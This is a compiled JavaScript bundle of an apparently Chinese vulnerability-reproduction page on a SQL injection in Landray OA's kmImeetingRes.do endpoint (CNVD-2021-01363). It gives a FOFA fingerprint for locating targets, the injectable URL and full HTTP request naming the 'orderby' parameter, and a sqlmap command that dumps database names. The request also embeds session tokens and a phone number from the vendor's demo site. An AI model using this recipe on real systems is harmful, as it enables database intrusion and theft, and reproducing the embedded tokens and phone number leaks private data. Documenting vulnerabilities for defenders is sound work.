(window.webpackJsonp=window.webpackJsonp||[]).push([[579],{1763:function(s,t,a){s.exports=a.p+"assets/img/lanling-1.996c0323.png"},3054:function(s,t,a){"use strict";a.r(t);var r=a(64),e=Object(r.a)({},(function(){var s=this,t=s._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h1",{attrs:{id:"蓝凌oa-kmimeetingres-do-后台sql注入漏洞-cnvd-2021-01363"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#蓝凌oa-kmimeetingres-do-后台sql注入漏洞-cnvd-2021-01363"}},[s._v("#")]),s._v(" 蓝凌OA kmImeetingRes.do 后台SQL注入漏洞 CNVD-2021-01363")]),s._v(" "),t("h2",{attrs:{id:"漏洞描述"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),t("p",[s._v("深圳市蓝凌软件股份有限公司数字OA(EKP)存在SQL注入漏洞。攻击者可利用漏洞获取数据库敏感信息。")]),s._v(" "),t("h2",{attrs:{id:"漏洞影响"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),t("a-checkbox",{attrs:{checked:""}},[s._v("蓝凌OA")]),t("br"),s._v(" "),t("h2",{attrs:{id:"网络测绘"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),t("a-checkbox",{attrs:{checked:""}},[s._v('app="Landray-OA系统"')]),t("br"),s._v(" "),t("h2",{attrs:{id:"漏洞复现"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),t("p",[s._v("存在SQL注入的 Url为,这里拿官方的演示站点演示漏洞过程")]),s._v(" "),t("div",{staticClass:"language-plain line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-plain"}},[t("code",[s._v("https://xxx.xxx.xxx.xxx/km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&method=listUse&orderby=1&ordertype=down&s_ajax=true\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("其中存在SQL注入的参数为 "),t("code",[s._v("ordeby")]),s._v(" ， 数据包如下")]),s._v(" "),t("div",{staticClass:"language-sql line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-sql"}},[t("code",[s._v("GET "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("km"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("imeeting"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("km_imeeting_res"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("kmImeetingRes"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("do")]),s._v("?contentType"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("json"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("method"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("listUse"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("orderby"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("ordertype"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("down"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("s_ajax"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token boolean"}},[s._v("true")]),s._v(" HTTP"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1.1")]),s._v("\nHost: \nConnection: "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("close")]),s._v("\nPragma: "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("no")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("cache\nCache"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Control: "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("no")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("cache\nsec"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("ch"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("ua: "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Google Chrome"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("v"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"89"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Chromium"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("v"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"89"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('";Not A Brand"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("v"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"99"')]),s._v("\nsec"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("ch"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("ua"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("mobile: ?"),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("\nUpgrade"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Insecure"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Requests: "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("User")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Agent: Mozilla"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("5.0")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Windows NT "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.0")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" Win64"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" x64"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" AppleWebKit"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("537.36")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("KHTML"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("like")]),s._v(" Gecko"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" Chrome"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("89.0")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v(".4389")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v(".90")]),s._v(" Safari"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("537.36")]),s._v("\nAccept: "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("text")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("html"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("application"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("xhtml"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v("xml"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("application"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("xml"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("q"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.9")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("image"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("avif"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("image"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("webp"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("image"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("apng"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("q"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.8")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("application"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("signed"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("exchange"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("v"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("b3"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("q"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.9")]),s._v("\nSec"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("Fetch")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Site: "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("cross")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("site\nSec"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("Fetch")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("Mode")]),s._v(": navigate\nSec"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("Fetch")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("User")]),s._v(": ?"),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v("\nSec"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("Fetch")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Dest: document\nAccept"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Encoding: gzip"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" deflate\nAccept"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("Language")]),s._v(": zh"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("CN"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("zh"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("q"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.9")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("en"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("US"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("q"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.8")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("en"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("q"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.7")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("zh"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("TW"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("q"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.6")]),s._v("\nCookie: UM_distinctid"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1785")]),s._v("f7392888e1"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("02")]),s._v("ece8c7e9a996"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("5771031")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v("fa400"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1785")]),s._v("f73928943d"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" landray_danyuan"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token boolean"}},[s._v("null")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" landray_guanjianci"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token boolean"}},[s._v("null")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" landray_sorce"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("baidupinzhuanwy"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" landray_jihua"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token boolean"}},[s._v("null")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" JSESSIONID"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("232")]),s._v("B6933CF33B5422F9D2649739D48FE"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" Hm_lvt_223eecc93377a093d4111a2d7ea28f51"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1616509114")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1616566341")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1616566350")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" Hm_lpvt_223eecc93377a093d4111a2d7ea28f51"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1616566350")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" Hm_lvt_d14cb406f01f8101884d7cf81981d8bb"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1616509114")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1616566341")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1616566350")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" Hm_lpvt_d14cb406f01f8101884d7cf81981d8bb"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1616566507")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" Hm_lvt_95f4f43e7aa1fe68a51c44ae4eed925d"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1616509872")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1616509969")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1616509973")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1616566507")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" Hm_lpvt_95f4f43e7aa1fe68a51c44ae4eed925d"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1616566507")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" Hm_lvt_22f1fea4412727d23e6a998a4b46f2ab"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1616509872")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1616509969")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1616509973")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1616566507")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" Hm_lpvt_22f1fea4412727d23e6a998a4b46f2ab"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1616566507")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" fd_name"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),s._v("E5"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("95")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("8")]),s._v("A"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),s._v("E7"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("9")]),s._v("A"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("84")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),s._v("E5"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("93")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("88")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" fd_id"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1785")]),s._v("f817dd0f5a4beaa482646cb9a2d8"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" nc_phone"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("15572002383")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" j_lang"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("zh"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("CN"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" LtpaToken"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("AAECAzYwNUFEOEZBNjA1QjgxQkFsdW9stJ5e1pcW1hgQi3cOa0iEyAhdZZs"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" Hm_lvt_95cec2a2f107db33ad817ed8e4a3073b"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1616510026")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1616566523")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" Hm_lpvt_95cec2a2f107db33ad817ed8e4a3073b"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1616566523")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" add_customer"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br"),t("span",{staticClass:"line-number"},[s._v("13")]),t("br"),t("span",{staticClass:"line-number"},[s._v("14")]),t("br"),t("span",{staticClass:"line-number"},[s._v("15")]),t("br"),t("span",{staticClass:"line-number"},[s._v("16")]),t("br"),t("span",{staticClass:"line-number"},[s._v("17")]),t("br")])]),t("p",[s._v("保存为文件，使用 Sqlmap 跑一下注入")]),s._v(" "),t("div",{staticClass:"language-plain line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-plain"}},[t("code",[s._v("sqlmap -r sql.txt -p orderby --dbs\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[t("img",{attrs:{src:a(1763),alt:"img"}})])],1)}),[],!1,null,null,null);t.default=e.exports}}]);